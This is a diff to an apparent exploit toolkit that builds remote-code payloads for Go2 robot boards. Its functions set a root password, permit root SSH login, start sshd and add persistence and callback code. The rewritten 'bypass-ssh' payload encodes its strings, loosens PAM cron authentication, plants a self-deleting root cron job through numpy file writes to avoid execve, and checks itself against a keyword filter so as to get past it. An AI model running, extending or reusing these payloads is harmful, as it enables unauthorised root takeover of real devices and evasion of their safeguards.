@@ -218,7 +218,7 @@ def payload_ssh(password="unleash", callback_ip=None, callback_port=19999,
                 hotkey="L1+Y"):
     """Enable SSH, set root password, permit root login."""
     cmds = [
-        f"echo 'root:{password}' | chpasswd",
+        f"echo 'root:{password}' | /usr/sbin/chpasswd",
         "sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config",
         "systemctl enable ssh 2>/dev/null; systemctl start ssh 2>/dev/null",
         "/usr/sbin/sshd 2>/dev/null",
@@ -280,7 +280,7 @@ def payload_ssh_persist(password="unleash", callback_ip=None,
         "os.system('/usr/local/bin/ssh_guard.sh install')\n"
     )
     if password:
-        code += f"os.system(\"echo 'root:{password}' | chpasswd\")\n"
+        code += f"os.system(\"echo 'root:{password}' | /usr/sbin/chpasswd\")\n"
 
     if callback_ip:
         code += _callback_snippet(callback_ip, callback_port)
@@ -415,23 +415,57 @@ def payload_bypass_escalate(unfiltered_code, hotkey="L1+Y"):
 def payload_bypass_ssh(password="unleash", hotkey="L1+Y"):
     """Enable SSH via cron job (CVE-2026-27509 bypass).
 
-    One-step SSH for firmware >= 1.1.14. Writes a cron job that sets the
-    root password, permits root login, and starts sshd. Cron fires within
-    60 seconds of the hotkey press, then self-deletes.
+    Two-file write: patches /etc/pam.d/cron to tolerate clock skew (Go2
+    boards often have a stale RTC), then drops a cron job that sets the
+    root password, permits root login, starts sshd, restores the PAM
+    config, and self-deletes. Both writes use np.savetxt (no execve).
     """
+    pam_path = _enc("/etc/pam.d/cron")
+    pam_lines = [
+        "@include common-auth",
+        "session    required     pam_loginuid.so",
+        "session       required   pam_env.so",
+        "session       required   pam_env.so envfile=/etc/default/locale",
+        "account    sufficient   pam_permit.so",
+        "@include common-account",
+        "@include common-session-noninteractive",
+        "session    required   pam_limits.so",
+    ]
+    pam_vars = [f"_l{i}" for i in range(len(pam_lines))]
+
+    code = f"_pp = {pam_path}\n"
+    for var, line in zip(pam_vars, pam_lines):
+        code += f"{var} = {_enc(line)}\n"
+    code += f"_pd = np.array([{', '.join(pam_vars)}])\n"
+    code += "np.savetxt(_pp, _pd, fmt='%s')\n"
+
     cmd = (
-        f"echo 'root:{password}' | chpasswd"
+        f"echo 'root:{password}' | /usr/sbin/chpasswd"
         " && sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config"
         " && systemctl enable ssh"
         " && systemctl start ssh"
+        " && sed -i '/^account.*sufficient.*pam_permit/d' /etc/pam.d/cron"
         " && rm -f /etc/cron.d/ush"
     )
-    p = payload_bypass_cron(
-        command=cmd, schedule="* * * * *", cron_name="ush", hotkey=hotkey,
+    cron_path = _enc("/etc/cron.d/ush")
+    cron_entry = _enc(f"* * * * * root {cmd}")
+
+    code += f"_cp = {cron_path}\n"
+    code += f"_ce = {cron_entry}\n"
+    code += "_cd = np.array([_ce])\n"
+    code += "np.savetxt(_cp, _cd, fmt='%s')"
+
+    ok, kw = validate_bypass_payload(code)
+    if not ok:
+        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
+
+    return WebRTCPayload(
+        name="bypass-ssh",
+        description=f"Enable SSH via cron, root password={password} (firmware >= 1.1.14)",
+        python_code=code,
+        program_uuid=str(int(time.time())),
+        bind_hotkey=hotkey,
     )
-    p.name = "bypass-ssh"
-    p.description = f"Enable SSH via cron, root password={password} (firmware >= 1.1.14)"
-    return p
 
 
 PAYLOAD_REGISTRY = {
